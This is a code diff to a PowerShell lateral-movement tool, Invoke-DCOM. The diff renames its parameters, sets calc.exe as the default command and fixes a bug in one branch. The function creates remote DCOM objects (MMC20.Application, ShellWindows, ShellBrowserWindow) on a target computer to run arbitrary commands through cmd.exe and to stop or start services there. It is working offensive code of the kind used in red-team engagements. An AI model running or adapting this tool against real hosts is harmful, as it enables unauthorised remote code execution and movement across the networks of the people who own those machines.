@@ -47,12 +47,12 @@ function Invoke-DCOM {
     Param (
         [Parameter(Mandatory = $true, Position = 0, ValueFromPipeLine = $true, ValueFromPipelineByPropertyName = $true)]
         [String]
-        $Target,
+        $ComputerName,
 
         [Parameter(Mandatory = $true, Position = 1)]
         [ValidateSet("MMC20", "ShellWindows","ShellBrowserWindow","CheckDomain","ServiceCheck","MinimizeAll","ServiceStop","ServiceStart")]
         [String]
-        $Type = "MMC20",
+        $Method = "MMC20",
 
         [Parameter(Mandatory = $false, Position = 2)]
         [string]
@@ -60,43 +60,43 @@ function Invoke-DCOM {
 
         [Parameter(Mandatory = $false, Position = 3)]
         [string]
-        $Command
+        $Command= "calc.exe"
     )
 
     Begin {
 
     #Declare some DCOM objects
-       if ($Type -Match "ShellWindows") {
+       if ($Method -Match "ShellWindows") {
 
             [String]$DCOM = '9BA05972-F6A8-11CF-A442-00A0C90A8F39'
         }
         
-        elseif ($Type -Match "ShellBrowserWindow") {
+        elseif ($Method -Match "ShellBrowserWindow") {
 
             [String]$DCOM = 'C08AFD90-F2A1-11D1-8455-00A0C91F3880'
         }
 
-        elseif ($Type -Match "CheckDomain") {
+        elseif ($Method -Match "CheckDomain") {
 
             [String]$DCOM = 'C08AFD90-F2A1-11D1-8455-00A0C91F3880'
         }
 
-        elseif ($Type -Match "ServiceCheck") {
+        elseif ($Method -Match "ServiceCheck") {
 
             [String]$DCOM = 'C08AFD90-F2A1-11D1-8455-00A0C91F3880'
         }
 
-        elseif ($Type -Match "MinimizeAll") {
+        elseif ($Method -Match "MinimizeAll") {
 
             [String]$DCOM = 'C08AFD90-F2A1-11D1-8455-00A0C91F3880'
         }
 
-        elseif ($Type -Match "ServiceStop") {
+        elseif ($Method -Match "ServiceStop") {
 
             [String]$DCOM = 'C08AFD90-F2A1-11D1-8455-00A0C91F3880'
         }
 
-        elseif ($Type -Match "ServiceStart") {
+        elseif ($Method -Match "ServiceStart") {
 
             [String]$DCOM = 'C08AFD90-F2A1-11D1-8455-00A0C91F3880'
         }
@@ -108,58 +108,58 @@ function Invoke-DCOM {
         #Begin main process block
 
         #Check for which type we are using and apply options accordingly
-        if ($Type -Match "MMC20") {
+        if ($Method -Match "MMC20") {
 
-            $Com = [Type]::GetTypeFromProgID("MMC20.Application","$Target")
+            $Com = [Type]::GetTypeFromProgID("MMC20.Application","$ComputerName")
             $Obj = [System.Activator]::CreateInstance($Com)
-            $Obj.Document.ActiveView.ExecuteShellCommand("$Command",$null,$null,"7")
+            $Obj.Document.ActiveView.ExecuteShellCommand($Command,$null,$null,"7")
         }
-        elseif ($Type -Match "ShellWindows") {
+        elseif ($Method -Match "ShellWindows") {
 
-            $Com = [Type]::GetTypeFromCLSID("$DCOM","$Target")
+            $Com = [Type]::GetTypeFromCLSID("$DCOM","$ComputerName")
             $Obj = [System.Activator]::CreateInstance($Com)
             $Item = $Obj.Item()
             $Item.Document.Application.ShellExecute("cmd.exe","/c $Command","c:\windows\system32",$null,0)
         }
 
-        elseif ($Type -Match "ShellBrowserWindow") {
+        elseif ($Method -Match "ShellBrowserWindow") {
 
-            $Com = [Type]::GetTypeFromCLSID("$DCOM","$Target")
+            $Com = [Type]::GetTypeFromCLSID("$DCOM","$ComputerName")
             $Obj = [System.Activator]::CreateInstance($Com)
-            $Item.Document.Application.ShellExecute("cmd.exe","/c $Command","c:\windows\system32",$null,0)
+            $Obj.Document.Application.ShellExecute("cmd.exe","/c $Command","c:\windows\system32",$null,0)
         }
 
-        elseif ($Type -Match "CheckDomain") {
+        elseif ($Method -Match "CheckDomain") {
 
-            $Com = [Type]::GetTypeFromCLSID("$DCOM","$Target")
+            $Com = [Type]::GetTypeFromCLSID("$DCOM","$ComputerName")
             $Obj = [System.Activator]::CreateInstance($Com)
-            $obj.Document.Application.GetSystemInformation("IsOS_DomainMember")
+            $Obj.Document.Application.GetSystemInformation("IsOS_DomainMember")
         }
 
-        elseif ($Type -Match "ServiceCheck") {
+        elseif ($Method -Match "ServiceCheck") {
 
-            $Com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","$Target")
+            $Com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","$ComputerName")
             $Obj = [System.Activator]::CreateInstance($Com)
             $obj.Document.Application.IsServiceRunning("$ServiceName")
         }
 
-        elseif ($Type -Match "MinimizeAll") {
+        elseif ($Method -Match "MinimizeAll") {
 
-            $Com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","$Target")
+            $Com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","$ComputerName")
             $Obj = [System.Activator]::CreateInstance($Com)
             $obj.Document.Application.MinimizeAll()
         }
 
-        elseif ($Type -Match "ServiceStop") {
+        elseif ($Method -Match "ServiceStop") {
 
-            $Com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","$Target")
+            $Com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","$ComputerName")
             $Obj = [System.Activator]::CreateInstance($Com)
             $obj.Document.Application.ServiceStop("$ServiceName")
         }
         
-        elseif ($Type -Match "ServiceStart") {
+        elseif ($Method -Match "ServiceStart") {
 
-            $Com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","$Target")
+            $Com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","$ComputerName")
             $Obj = [System.Activator]::CreateInstance($Com)
             $obj.Document.Application.ServiceStart("$ServiceName")
         }
